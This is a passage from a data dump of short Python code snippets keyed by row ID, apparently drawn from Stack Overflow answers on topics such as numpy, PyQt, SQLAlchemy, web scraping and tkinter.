</snippet></ROW><ROW><id>20436919</id><snippet>image/png</snippet></ROW><ROW><id>20436982</id><snippet>filesystem</snippet></ROW><ROW><id>20436982</id><snippet>file</snippet></ROW><ROW><id>20436982</id><snippet>Math.random</snippet></ROW><ROW><id>20437000</id><snippet>timeout</snippet></ROW><ROW><id>20437000</id><snippet>FTP</snippet></ROW><ROW><id>20437000</id><snippet>class ftplib.FTP([host[, user[, passwd[, acct[, timeout]]]]])</snippet></ROW><ROW><id>20437000</id><snippet>FTP</snippet></ROW><ROW><id>20437000</id><snippet>host</snippet></ROW><ROW><id>20437000</id><snippet>connect(host)</snippet></ROW><ROW><id>20437000</id><snippet>user</snippet></ROW><ROW><id>20437000</id><snippet>login(user, passwd, acct)</snippet></ROW><ROW><id>20437000</id><snippet>passwd</snippet></ROW><ROW><id>20437000</id><snippet>acct</snippet></ROW><ROW><id>20437000</id><snippet>timeout</snippet></ROW><ROW><id>20437000</id><snippet>timeout</snippet></ROW><ROW><id>20437000</id><snippet>socket.timeout</snippet></ROW><ROW><id>20437026</id><snippet>def find_student():
    print "Find" 
    idnum=raw_input("Enter Student ID:")
    try:
        print "Name: " + students[idnum]["name"]
        print "ID Number: " + idnum
        print "Date of Birth: " + students[idnum]["bday"]
    except KeyError, ex:
        print ex.message + ' not found'
</snippet></ROW><ROW><id>20437026</id><snippet>student[idnum]</snippet></ROW><ROW><id>20437026</id><snippet>[idnum]</snippet></ROW><ROW><id>20437109</id><snippet>array</snippet></ROW><ROW><id>20437109</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; a=np.random.randint(0,20,size=24)
&gt;&gt;&gt; b=np.arange(24)
&gt;&gt;&gt; b[(8&lt;a)&amp;(a&lt;15)] #rather than 8&lt;a&lt;15
array([ 3,  5,  6, 11, 13, 16, 17, 18, 20, 21, 22, 23])
</snippet></ROW><ROW><id>20437109</id><snippet>(-1,4)</snippet></ROW><ROW><id>20437109</id><snippet>data[group]</snippet></ROW><ROW><id>20437109</id><snippet>&gt;&gt;&gt; b=np.arange(96)
&gt;&gt;&gt; b.reshape((-1,4))[(8&lt;a)&amp;(a&lt;15)]
array([[12, 13, 14, 15],
       [20, 21, 22, 23],
       [24, 25, 26, 27],
       [44, 45, 46, 47],
       [52, 53, 54, 55],
       [64, 65, 66, 67],
       [68, 69, 70, 71],
       [72, 73, 74, 75],
       [80, 81, 82, 83],
       [84, 85, 86, 87],
       [88, 89, 90, 91],
       [92, 93, 94, 95]])
</snippet></ROW><ROW><id>20437168</id><snippet>print ('and',)
</snippet></ROW><ROW><id>20437168</id><snippet>'and'</snippet></ROW><ROW><id>20437168</id><snippet>print</snippet></ROW><ROW><id>20437168</id><snippet>('and',)
</snippet></ROW><ROW><id>20437168</id><snippet>'and'
</snippet></ROW><ROW><id>20437168</id><snippet>print
</snippet></ROW><ROW><id>20437168</id><snippet>print()
</snippet></ROW><ROW><id>20437168</id><snippet>months[index] = input(name_months[index] + ': ')
</snippet></ROW><ROW><id>20437168</id><snippet>input</snippet></ROW><ROW><id>20437168</id><snippet>raw_input</snippet></ROW><ROW><id>20437168</id><snippet>input</snippet></ROW><ROW><id>20437168</id><snippet>raw_input</snippet></ROW><ROW><id>20437168</id><snippet>months[index]</snippet></ROW><ROW><id>20437168</id><snippet>total += num
</snippet></ROW><ROW><id>20437168</id><snippet>num</snippet></ROW><ROW><id>20437168</id><snippet>months</snippet></ROW><ROW><id>20437168</id><snippet>months[index] = int(input(name_months[index] + ': '))    
</snippet></ROW><ROW><id>20437483</id><snippet>python-dev</snippet></ROW><ROW><id>20437483</id><snippet>python</snippet></ROW><ROW><id>20437539</id><snippet>data = [(220921998, 2426),
        (220921999, 2427),
        (220922000, 2428),
        (220922001, 2429),
        ...
        (220922563, 2991),
        (220922564, 2992)]

ref = 0
cnt = 0
out = []
for dt in data:
    if dt[1]-ref &gt; 20:
        cnt += 1
        ref = dt[1]
    out.append((dt[0],dt[1],'project%d'%cnt))
</snippet></ROW><ROW><id>20437544</id><snippet>/admin/</snippet></ROW><ROW><id>20437544</id><snippet>application</snippet></ROW><ROW><id>20437544</id><snippet>application = webapp2.WSGIApplication([
    ('/admin/', AdminPage),
], debug=True)
</snippet></ROW><ROW><id>20437544</id><snippet>/admin/</snippet></ROW><ROW><id>20437544</id><snippet>login: admin</snippet></ROW><ROW><id>20437544</id><snippet>app.yaml</snippet></ROW><ROW><id>20437544</id><snippet>admin.py</snippet></ROW><ROW><id>20437544</id><snippet>/admin/</snippet></ROW><ROW><id>20437544</id><snippet>/</snippet></ROW><ROW><id>20437601</id><snippet>DataReader</snippet></ROW><ROW><id>20437601</id><snippet>get_data_yahoo</snippet></ROW><ROW><id>20437601</id><snippet>get_data_yahoo</snippet></ROW><ROW><id>20437653</id><snippet>ui</snippet></ROW><ROW><id>20437653</id><snippet>mainwindow.ui</snippet></ROW><ROW><id>20437653</id><snippet>pyuic4 -o mainwindow_ui.py mainwindow.ui
</snippet></ROW><ROW><id>20437653</id><snippet>main.py</snippet></ROW><ROW><id>20437653</id><snippet>main.py</snippet></ROW><ROW><id>20437653</id><snippet>from PyQt4 import QtCore, QtGui
from mainwindow_ui import Ui_MainWindow

class MainWindow(QtGui.QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        QtGui.QMainWindow.__init__(self, parent)
        self.setupUi(self)
        header = self.tableWidget.horizontalHeader()
        header.setResizeMode(QtGui.QHeaderView.ResizeToContents)
        ...

if __name__ == '__main__':

    import sys
    app = QtGui.QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
</snippet></ROW><ROW><id>20437653</id><snippet>objectName</snippet></ROW><ROW><id>20437653</id><snippet>objectName</snippet></ROW><ROW><id>20437653</id><snippet>MainWindow</snippet></ROW><ROW><id>20437653</id><snippet>objectName</snippet></ROW><ROW><id>20437779</id><snippet>Scenario.hints</snippet></ROW><ROW><id>20437779</id><snippet>&gt;&gt;&gt; scenarios = Scenario.query.join(Hint).filter(Hint.release_time &lt; time.time())
&gt;&gt;&gt; scenarios.first()
&gt;&gt;&gt; &lt;Scenario(scenario_name='hi', scenario_text='world', hints='SELECT hints.hint_id AS hints_hint_id, hints.scenario_id AS hints_scenario_id, hints.hint AS hints_hint, hints.release_time AS hints_release_time FROM hints WHERE :param_1 = hints.scenario_id')&gt;
</snippet></ROW><ROW><id>20437803</id><snippet>import graphics
</snippet></ROW><ROW><id>20437803</id><snippet>from module import graphics
</snippet></ROW><ROW><id>20437803</id><snippet>Point</snippet></ROW><ROW><id>20437803</id><snippet>p2 = Point(x+25, y+25) # This fails.
</snippet></ROW><ROW><id>20437803</id><snippet>Point</snippet></ROW><ROW><id>20437803</id><snippet>graphics</snippet></ROW><ROW><id>20437803</id><snippet>Point</snippet></ROW><ROW><id>20437803</id><snippet>p2 = graphics.Point(x+25, y+25) # This works fine!
</snippet></ROW><ROW><id>20437803</id><snippet>Point</snippet></ROW><ROW><id>20437803</id><snippet>graphics</snippet></ROW><ROW><id>20437803</id><snippet>graphics.</snippet></ROW><ROW><id>20437803</id><snippet>from graphics import Point

p2 = Point(x+25, y+25) # This works fine now!
</snippet></ROW><ROW><id>20437806</id><snippet>color</snippet></ROW><ROW><id>20437806</id><snippet>&lt;RootLayout&gt;:
    rows: 1
    Label:
        text: "Why does this not work?"
        color: 1,0,1,1 # &lt;-----------
        canvas.before:
            Color:
                rgba: 0, 0, 0, 1
            Rectangle:
                pos: self.pos
                size: self.size
</snippet></ROW><ROW><id>20437894</id><snippet>if scores[index] == Searchword</snippet></ROW><ROW><id>20437894</id><snippet>if names[index] == Searchword :</snippet></ROW><ROW><id>20437894</id><snippet>Searchword= input('enter a searchword:')</snippet></ROW><ROW><id>20437894</id><snippet>while</snippet></ROW><ROW><id>20437894</id><snippet>def main():
    names=[0]*10
    for index in range(len(names)):
        names[index] = input("Enter word " + str(index + 1) + ": ")
    bubbleSort(names)
    print("Names in Alphabetical order:")
    print(names)
def bubbleSort(names):
    for maxElement in range(len(names)-1, 0, -1):
        for index in range(maxElement):
            if names[index] &gt; names[index+1]:
                temp = names[index]
                names[index] = names[index+1]
                names[index+1] = temp
    found = False
    index=0
    Searchword= input('enter a searchword:')
    while found == False and index &lt; len(names):
       if names[index] == Searchword :
            found = True
        else:
            index = index + 1
    if found:
        print("Found")
    else:
        print("Not Found")

main()
</snippet></ROW><ROW><id>20438054</id><snippet>draw</snippet></ROW><ROW><id>20438054</id><snippet>DieViewGreen</snippet></ROW><ROW><id>20438604</id><snippet>class Node(object):
    def __init__(self, data=None, next=None):
        self.data = data
        self.next = next
    def __str__(self):
        return str(self.data)

def create_linked_list(n):
    """Creating linked list for the given
       size"""
    linked_list = Node(1)
    head = linked_list
    for i in range(2, n):
        head.next = Node(i)
        head = head.next
    return linked_list

def print_linked_list(node):
    """To print the linked list in forward"""
    while node:
        print '[',node,']','[ref] -&gt;',
        node = node.next
    print '-&gt; None'

def find_middle1(node):
    tick = False
    half = node
    while node:
        node = node.next
        if tick:
            half = half.next
        tick = not tick
    return "Middle node is %s" % str(half)

def find_middle2(node):
    list = []
    while node:
        list.append(node)
        node = node.next
    return "Middle node is %s" % str(list[len(list)/2])


node = create_linked_list(10)
print_linked_list(node)

print find_middle1(node)
print find_middle2(node)
</snippet></ROW><ROW><id>20438604</id><snippet>[ 1 ] [ref] -&gt; [ 2 ] [ref] -&gt; [ 3 ] [ref] -&gt; [ 4 ] [ref] -&gt; [ 5 ] [ref] -&gt; [ 6 ] [ref] -&gt; [ 7 ] [ref] -&gt; [ 8 ] [ref] -&gt; [ 9 ] [ref] -&gt; -&gt; None
Middle node is 5
Middle node is 5
</snippet></ROW><ROW><id>20438616</id><snippet>for u, p in zip(actual_user.values(), passwd.values()):
    if login == u and password == p:
        print "WELCOME !!"
        break
else:
    print "&lt;h4&gt;Invalid Login&lt;/h4&gt;"
</snippet></ROW><ROW><id>20438616</id><snippet>logindb = {row[1]:row[2] for row in prsnobj.result}

if login in logindb and logindb[login] == password:
    print "WELCOME !!" 
else:
    print "&lt;h4&gt;Invalid Login&lt;/h4&gt;"
</snippet></ROW><ROW><id>20438660</id><snippet>is</snippet></ROW><ROW><id>20438660</id><snippet>==</snippet></ROW><ROW><id>20438660</id><snippet>==</snippet></ROW><ROW><id>20438660</id><snippet>"s"</snippet></ROW><ROW><id>20438660</id><snippet>str("s")</snippet></ROW><ROW><id>20438660</id><snippet>'s'</snippet></ROW><ROW><id>20438660</id><snippet>strcmp</snippet></ROW><ROW><id>20438870</id><snippet>InheritanceCastModel</snippet></ROW><ROW><id>20438870</id><snippet>from model_utils.managers import InheritanceManager

class MyBaseModel(models.Model):
    objects = InheritanceManager()
</snippet></ROW><ROW><id>20438870</id><snippet>.get_subclass()</snippet></ROW><ROW><id>20438870</id><snippet>.get</snippet></ROW><ROW><id>20438870</id><snippet>item = MyBaseModel.objects.get_subclass(pk=item_id)
print type(item)
&gt;&gt;&gt; &lt;class 'MySubClass1'&gt;
</snippet></ROW><ROW><id>20438912</id><snippet>request</snippet></ROW><ROW><id>20438912</id><snippet>bundle</snippet></ROW><ROW><id>20438912</id><snippet>user_id = bundle.request.user.id
</snippet></ROW><ROW><id>20438925</id><snippet>raise</snippet></ROW><ROW><id>20438925</id><snippet>try:
    raise socket.error
except socket.error as err:
    print "Connection lost, waiting..."
    time.sleep(5)
</snippet></ROW><ROW><id>20438925</id><snippet>try:
    raise AttributeError
except AttributeError:
    print 'Sorry'
#Sorry
</snippet></ROW><ROW><id>20439124</id><snippet>writer.writerow(v[0, 3])</snippet></ROW><ROW><id>20439124</id><snippet>writer.writerow(tuple(v[::3]))</snippet></ROW><ROW><id>20439124</id><snippet>writer.writerow((v[0], v[3]))</snippet></ROW><ROW><id>20439124</id><snippet>[::#]</snippet></ROW><ROW><id>20439124</id><snippet>#</snippet></ROW><ROW><id>20439124</id><snippet>(v[0],v[3],v[6],...)</snippet></ROW><ROW><id>20439124</id><snippet>v[0,3]</snippet></ROW><ROW><id>20439407</id><snippet>import thread
import time

def read_key():
    import termios
    import sys
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    new = termios.tcgetattr(fd)
    new[3] &amp;= ~(termios.ICANON | termios.ECHO) # c_lflags
    c = None
    try:
        termios.tcsetattr(fd, termios.TCSANOW, new)
        c = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSANOW, old)
    return c

def input_thread():
    read_key()
    thread.interrupt_main()

def countup():
    try:
        thread.start_new_thread(input_thread, ())
        for i in range(1000000):
            print i
            time.sleep(1)
    except KeyboardInterrupt:
        Z = raw_input("restart timer? ")
        if Z == 'y' or Z == 'Y':
            countup()
</snippet></ROW><ROW><id>20439407</id><snippet>thread.start_new_thread()</snippet></ROW><ROW><id>20439407</id><snippet>input_thread()</snippet></ROW><ROW><id>20439407</id><snippet>thread.interrupt_main()</snippet></ROW><ROW><id>20439407</id><snippet>KeyboardInterrupt</snippet></ROW><ROW><id>20439407</id><snippet>termios.tcgetattr()</snippet></ROW><ROW><id>20439407</id><snippet>~termios.ICANON</snippet></ROW><ROW><id>20439407</id><snippet>~termios.ECHO</snippet></ROW><ROW><id>20439407</id><snippet>termios.tsetattr()</snippet></ROW><ROW><id>20439407</id><snippet>getch()</snippet></ROW><ROW><id>20439407</id><snippet>read_key()</snippet></ROW><ROW><id>20439407</id><snippet>def input_thread():
    msvcrt.getch()
    thread.interrupt_main()
</snippet></ROW><ROW><id>20439449</id><snippet>data = ""
while True:
    chunk = conn.recv(2048).decode()
    if not data:
        break
    # try to separate the chunk by newline, to see if you got one.
    while True:
        split = chunk.split("\r\n", num=1)
        data += split[0]
        if len(split) == 1:
            break
        # Now we have a completed newline, so send the response
        replay = 'OK....' + data
        conn.sendall(replay.encode())
        data = ""
conn.close()
</snippet></ROW><ROW><id>20439523</id><snippet>login</snippet></ROW><ROW><id>20439523</id><snippet>c = gspread.Client(auth=('user@example.com', 'qwertypassword'))
c.login()
</snippet></ROW><ROW><id>20439524</id><snippet>import urllib2
from bs4 import BeautifulSoup

url1 = "http://www.salatomatic.com/c/Sydney+168"
content1 = urllib2.urlopen(url1).read()
soup = BeautifulSoup(content1)
for link in soup.findAll('a'):
   print link.get('href')
</snippet></ROW><ROW><id>20439525</id><snippet>INFILE = open("pages.txt","r")
file = INFILE.readlines()

listA = []
ID_List = []
for line in file:
        if (line[6:8] =="id"):
        line = line.strip()
        listA.append(line)
    for id in listA:
        item = id[7:-2]
        item = item.strip()
        if item not in ID_List:
            ID_List.append(item)
print "List of all IDS:",ID_List
</snippet></ROW><ROW><id>20439525</id><snippet>&gt;&gt;&gt; 
List of all IDS: ['108051929285833', '187751327923426', '612789834']
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>20439625</id><snippet>pass</snippet></ROW><ROW><id>20439625</id><snippet>class SomeClass(object):
   def some_method(self):
       pass
   def method(self):
       pass
</snippet></ROW><ROW><id>20439625</id><snippet>NotImplementedError</snippet></ROW><ROW><id>20439626</id><snippet>for link in soup.findAll('a'):
    currenturl =  link.get('href')
    if not currenturl.startswith("http"):
        currenturl = "http://test.url/" + currenturl
    print currenturl
</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>gevent.Greenlet</snippet></ROW><ROW><id>20440259</id><snippet>greenlet.greenlet</snippet></ROW><ROW><id>20440259</id><snippet>greenlet.greenlet</snippet></ROW><ROW><id>20440259</id><snippet>__new__</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>green_new</snippet></ROW><ROW><id>20440259</id><snippet>greenlet</snippet></ROW><ROW><id>20440259</id><snippet>__new__</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>float</snippet></ROW><ROW><id>20440259</id><snippet>import abc

class A(object):
    def __new__(cls):
        # self = object.__new__(cls)
        return 42

class B(A):
    __metaclass__ = abc.ABCMeta

    @abc.abstractmethod
    def foo(self):
        pass

b = B()  # No exception.
</snippet></ROW><ROW><id>20440259</id><snippet>B</snippet></ROW><ROW><id>20440259</id><snippet>Py_TPFLAGS_IS_ABSTRACT</snippet></ROW><ROW><id>20440259</id><snippet>tp_flags</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>B</snippet></ROW><ROW><id>20440259</id><snippet>self = object.__new__(cls)</snippet></ROW><ROW><id>20440259</id><snippet>A</snippet></ROW><ROW><id>20440259</id><snippet>greenlet</snippet></ROW><ROW><id>20440259</id><snippet>__new__</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>__new__</snippet></ROW><ROW><id>20440259</id><snippet>ActorBase</snippet></ROW><ROW><id>20440259</id><snippet>__new__</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>TypeError: object.__new__(ActorBase) is not safe, use greenlet.greenlet.__new__()</snippet></ROW><ROW><id>20440259</id><snippet>object.__new__</snippet></ROW><ROW><id>20440259</id><snippet>CHasTraits</snippet></ROW><ROW><id>20440259</id><snippet>__new__</snippet></ROW><ROW><id>20440259</id><snippet>PyObject *
has_traits_new ( PyTypeObject * type, PyObject * args, PyObject * kwds ) {

    // Call PyBaseObject_Type.tp_new to do the actual construction.
    // This allows things like ABCMeta machinery to work correctly
    // which is implemented at the C level.
    has_traits_object * obj = (has_traits_object *) PyBaseObject_Type.tp_new(type, empty_tuple, empty_dict);
</snippet></ROW><ROW><id>20440259</id><snippet>greenlet</snippet></ROW><ROW><id>20440260</id><snippet>&lt;div&gt;</snippet></ROW><ROW><id>20440260</id><snippet>class</snippet></ROW><ROW><id>20440260</id><snippet>tinyLink</snippet></ROW><ROW><id>20440260</id><snippet>&lt;b&gt;</snippet></ROW><ROW><id>20440260</id><snippet>&lt;br&gt;</snippet></ROW><ROW><id>20440260</id><snippet>...
print pos 
div = result.find_next_sibling('div', attrs={"class": "tinyLink"})
if div and div.b and div.br:
    print(div.b.next_sibling.string)
    print(div.br.next_sibling.string)
</snippet></ROW><ROW><id>20440288</id><snippet>AAPL</snippet></ROW><ROW><id>20440288</id><snippet>Panel</snippet></ROW><ROW><id>20440288</id><snippet>&gt;&gt;&gt; stock_name = 'AAPL'
&gt;&gt;&gt; OHLC = pd.io.data.DataReader([stock_name],'yahoo',start='01/01/2010')
&gt;&gt;&gt; OHLC
&lt;class 'pandas.core.panel.Panel'&gt;
Dimensions: 6 (items) x 990 (major_axis) x 1 (minor_axis)
Items axis: Open to Adj Close
Major_axis axis: 2010-01-04 00:00:00 to 2013-12-06 00:00:00
Minor_axis axis: AAPL to AAPL
&gt;&gt;&gt; OHLC.axes[2]
Index([u'AAPL'], dtype=object)
</snippet></ROW><ROW><id>20440288</id><snippet>&gt;&gt;&gt; OHLC.ix[:,:,'AAPL']
&lt;class 'pandas.core.frame.DataFrame'&gt;
DatetimeIndex: 990 entries, 2010-01-04 00:00:00 to 2013-12-06 00:00:00
Data columns (total 6 columns):
Open         990  non-null values
High         990  non-null values
Low          990  non-null values
Close        990  non-null values
Volume       990  non-null values
Adj Close    990  non-null values
dtypes: float64(6)
</snippet></ROW><ROW><id>20440288</id><snippet>&gt;&gt;&gt; OHLC = (stock_name, pd.io.data.DataReader(stock_name,'yahoo',start='01/01/2010'))
</snippet></ROW><ROW><id>20440288</id><snippet>&gt;&gt;&gt; name, df = OHLC
&gt;&gt;&gt; name
'AAPL'
</snippet></ROW><ROW><id>20440297</id><snippet>gt = geotiff.GetGeoTransform()
minx = gt[0]
miny = gt[3] + width*gt[4] + height*gt[5] 
maxx = gt[0] + width*gt[1] + height*gt[2]
maxy = gt[3]
</snippet></ROW><ROW><id>20440297</id><snippet>latPxSz = (maxy - miny) / row_numbers
lonPxSz = (maxx - minx) / column_numbers
</snippet></ROW><ROW><id>20440297</id><snippet>i</snippet></ROW><ROW><id>20440297</id><snippet>j</snippet></ROW><ROW><id>20440297</id><snippet>boxCenterLat = (i + 0.5) * 50 * latPxSz + miny
boxCenterLon = (j + 0.5) * 50 * lonPxSz + minx
</snippet></ROW><ROW><id>20440412</id><snippet>ActiveTcl8.5.15.1.297588</snippet></ROW><ROW><id>20440412</id><snippet>ActiveTcl8.6.1.1.297588</snippet></ROW><ROW><id>20440435</id><snippet>plot(x, y, color='green', linestyle='dashed', marker='o').</snippet></ROW><ROW><id>20440443</id><snippet>class AngularJSTextInput(TextInput):
    def __call__(self, field, **kwargs):
        for key in list(kwargs):
            if key.startswith('ng_'):
                kwargs['ng-' + key[3:]] = kwargs.pop(key)
        return super(AngularJSTextInput, self).__call__(field, **kwargs)
</snippet></ROW><ROW><id>20440443</id><snippet>ng_</snippet></ROW><ROW><id>20440443</id><snippet>ng-</snippet></ROW><ROW><id>20440443</id><snippet>widget</snippet></ROW><ROW><id>20440443</id><snippet>class MyForm(Form):
    name = StringField(u'Full Name', widget=AngularJSTextInput())
</snippet></ROW><ROW><id>20440443</id><snippet>{{ form.name(placeholder="Name", ng_model='NameModel') }}
</snippet></ROW><ROW><id>20440443</id><snippet>placeholder="Name" ng-model="NameModel"</snippet></ROW><ROW><id>20440443</id><snippet>&lt;input id="name" name="name" ng-model="NameModel" placeholder="Name" type="text" value=""&gt;
</snippet></ROW><ROW><id>20440464</id><snippet>info_list = soup.get_text().split('\n')

for i in info_list:
    print i  

Denomination: Sunni (Traditional)
Demographics: Predominantly Indonesian
Prayers: All prayers including formal jum a
Language of services: Indonesian
Imam: Unknown
Director/President: Aly Zakaria
Phone: +61 2 9591 1593
Website: Click here to visit website
Email: Click here to send email
</snippet></ROW><ROW><id>20441046</id><snippet>print(numlist.pop(2)+" has been removed")</snippet></ROW><ROW><id>20441046</id><snippet>int</snippet></ROW><ROW><id>20441046</id><snippet>str</snippet></ROW><ROW><id>20441046</id><snippet>print(str(numlist.pop(2)) + " has been removed")
</snippet></ROW><ROW><id>20441046</id><snippet>,</snippet></ROW><ROW><id>20441046</id><snippet>+</snippet></ROW><ROW><id>20441046</id><snippet>print(numlist.pop(2), "has been removed")
</snippet></ROW><ROW><id>20441046</id><snippet>print("{} has been removed".format(numlist.pop(2)))
</snippet></ROW><ROW><id>20441079</id><snippet>$('#link').click(function(){
  $.get('?channel=1',
    function(data) {
      $('#content').html(data);
    }
  );
});
</snippet></ROW><ROW><id>20441079</id><snippet>&lt;iframe width="800" height="400" id="content"&gt;&lt;/iframe&gt;
&lt;a data-url="http://www.twitch.tv/esltv_dota"&gt;esltv_dota&lt;/a&gt;
&lt;script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"&gt;&lt;/script&gt;
&lt;script&gt;
  $(document).ready(function(){
    $('#link').click(function(){
      $('#content').attr('src',$(this).attr('data-url'));
    });
  });
&lt;script&gt;
</snippet></ROW><ROW><id>20441281</id><snippet>IP</snippet></ROW><ROW><id>20441281</id><snippet>Topics</snippet></ROW><ROW><id>20441281</id><snippet>Host</snippet></ROW><ROW><id>20441281</id><snippet>Topics</snippet></ROW><ROW><id>20441281</id><snippet>IP</snippet></ROW><ROW><id>20441281</id><snippet>Topics</snippet></ROW><ROW><id>20441281</id><snippet>IP</snippet></ROW><ROW><id>20441281</id><snippet>IP</snippet></ROW><ROW><id>20441281</id><snippet>Host</snippet></ROW><ROW><id>20441281</id><snippet># subquery to get number of topics per IP
subq_ip_topics = (session.query(
        MCastSession.ip.label("mcast_session_ip"),
        func.count(Topic.id).label("num_topics")
    )
    .join(Topic)
    .group_by(MCastSession.ip)
    ).subquery().alias("ip_topics")

# subquery to get number of topics per host per ip
subq_host_ip_topics = (session.query(
        Host.id.label("host_id"),
        MCastSession.ip.label("mcast_session_ip"),
        func.count(Topic.id).label("num_topics")
    )
    .join(Subscriber)
    .join(Topic)
    .join(MCastSession)
    .group_by(Host.id, MCastSession.ip)
    ).subquery().alias("host_ip_topics")

# final query: get those Hosts where results on both sub-queries do not match
query = (session.query(Host)
        .join(subq_host_ip_topics, Host.id == subq_host_ip_topics.c.host_id)
        .join(subq_ip_topics, and_(
            subq_host_ip_topics.c.mcast_session_ip == subq_ip_topics.c.mcast_session_ip,
            subq_host_ip_topics.c.num_topics != subq_ip_topics.c.num_topics
            ))
        )
</snippet></ROW><ROW><id>20441281</id><snippet>SQL</snippet></ROW><ROW><id>20441281</id><snippet>SQLite</snippet></ROW><ROW><id>20441281</id><snippet>SELECT  host.id AS host_id, host.name AS host_name

FROM    host

JOIN   (SELECT  host.id AS host_id,
                mcast_session.ip AS mcast_session_ip,
                count(topic.id) AS num_topics
        FROM    host
        JOIN    subscriber
            ON  host.id = subscriber.host_id
        JOIN    topic
            ON  topic.id = subscriber.topic_id
        JOIN    mcast_session
            ON  mcast_session.id = topic.mcast_session_id
        GROUP BY host.id, mcast_session.ip
       ) AS host_ip_topics
    ON  host.id = host_ip_topics.host_id

JOIN   (SELECT  mcast_session.ip AS mcast_session_ip,
                count(topic.id) AS num_topics
        FROM    mcast_session
        JOIN    topic
            ON  mcast_session.id = topic.mcast_session_id
        GROUP BY mcast_session.ip
       ) AS ip_topics
    ON  host_ip_topics.mcast_session_ip = ip_topics.mcast_session_ip
    AND host_ip_topics.num_topics != ip_topics.num_topics
</snippet></ROW><ROW><id>20441281</id><snippet>aliased</snippet></ROW><ROW><id>20441281</id><snippet>(MCaseSession, NNN)</snippet></ROW><ROW><id>20441281</id><snippet>NNN</snippet></ROW><ROW><id>20441281</id><snippet>IP</snippet></ROW><ROW><id>20441281</id><snippet>aliased_MCastSession = aliased(MCastSession, name="MCastSession2")
qry = session.query(\
    MCastSession, \
    func.count(aliased_MCastSession.id).label("number_with_same_ip")).\
filter(MCastSession.ip == aliased_MCastSession.ip).\
group_by(MCastSession)
</snippet></ROW><ROW><id>20441305</id><snippet>data</snippet></ROW><ROW><id>20441305</id><snippet>data = JSON.parse(data)
</snippet></ROW><ROW><id>20441305</id><snippet>print</snippet></ROW><ROW><id>20441305</id><snippet>json.dumps(data)</snippet></ROW><ROW><id>20441307</id><snippet>dictionary.dat</snippet></ROW><ROW><id>20441307</id><snippet>beast
lemon
ape
apple
sea
pea
orange
bat
</snippet></ROW><ROW><id>20441307</id><snippet># Import python modules
import tkinter
import tkinter.messagebox
from collections import Counter

# Module level constants
SCORES = {'A': 1, 'C': 3, 'B': 3, 'E': 1, 'D': 2, 'G': 2, 'F': 4, 'I': 1,
          'H': 4, 'K': 5, 'J': 8, 'M': 3, 'L': 1, 'O': 1, 'N': 1, 'Q': 10,
          'P': 3, 'S': 1, 'R': 1, 'U': 1, 'T': 1, 'W': 4,  'V': 4, 'Y': 4,
          'X': 8, 'Z': 10}

class App(tkinter.Tk):

    def __init__(self, word_list, *args, **kwargs):
        # Initialize parent class by passing instance as first argument
        tkinter.Tk.__init__(self, *args, **kwargs)

        # Store values
        self.word_list = word_list

        # Setup main window
        self.title('Scrabble Solver')

        # Create widgets
        rack_label = tkinter.Label(self, text='Enter your rack')
        self.rack_entry = tkinter.Entry(self)
        rack_button = tkinter.Button(self, text='Enter', command=self.search)
        quit_button = tkinter.Button(self, text='Quit', command=self.quit)
        self.valid_list = tkinter.Listbox(self, width=40, font='Courier')

        # Place widgets
        rack_label.grid(row=0, column=0, sticky=tkinter.W)
        self.rack_entry.grid(row=1, column=0, sticky=tkinter.W)
        rack_button.grid(row=1, column=1, sticky=tkinter.W)
        quit_button.grid(row=1, column=2, sticky=tkinter.W)
        self.valid_list.grid(row=2, columnspan=3, sticky=tkinter.W)

    def run(self):
        # Enter event loop
        self.mainloop()

    def error(self):
        # Throw and error message dialog
        tkinter.messagebox.showinfo('You have entered too many letters!')

    def search(self):
        # Cleanup up valid list
        self.valid_list.delete(0, tkinter.END)
        # Get data of entry, and make them lower case
        rack = self.rack_entry.get().lower()
        # Check length of data
        if len(rack) &lt;= 8:
            return self.find_valid_words(rack)
        self.error()

    def find_valid_words(self, rack):
        # Create a dictionary for valid words and its values
        valid = {}
        rack_chars = Counter(rack)
        for word in self.word_list:
            word_chars = Counter(word)
            if word_chars == word_chars &amp; rack_chars:
                valid[word] = sum(SCORES[letter.upper()] for letter in word)

        # Sort the results and insert them into the list box
        if valid:
            for word, score in sorted(valid.items(), key=lambda v: v[1], reverse=True):
                self.valid_list.insert(tkinter.END, '{:&lt;10} {}'.format(word, score))
        else:
            self.valid_list.insert(tkinter.END, 'No results found.')

if __name__ == '__main__':
    # Open dictionary file and scan for words
    with open('dictionary.dat', 'r') as f:
        all_words = [word for word in f.read().split()]
    # Create instance and call run method
    App(all_words).run()
</snippet></ROW><ROW><id>20441485</id><snippet>itertools.product</snippet></ROW><ROW><id>20441485</id><snippet>import numpy as np

from itertools import product

class IterableNumber:
    def __init__(self, digits):
        self.digits = digits
        self.zero_indices = np.where(self.digits==0)[0]
        self.length = len(self.zero_indices)

    def __iter__(self):
        for x in product(range(10), repeat=self.length):
            self.digits[self.zero_indices] = np.array(x)
            yield self.digits
</snippet></ROW><ROW><id>20441485</id><snippet>&gt;&gt;&gt; for x in IterableNumber(np.array([5, 5, 0, 5, 0])):
    print x
...     
[5 5 0 5 0]
[5 5 0 5 1]
[5 5 0 5 2]
[5 5 0 5 3]
[5 5 0 5 4]
[5 5 0 5 5]
[5 5 0 5 6]
[5 5 0 5 7]
[5 5 0 5 8]
[5 5 0 5 9]
...
...
[5 5 9 5 3]
[5 5 9 5 4]
[5 5 9 5 5]
[5 5 9 5 6]
[5 5 9 5 7]
[5 5 9 5 8]
[5 5 9 5 9]
&gt;&gt;&gt; 
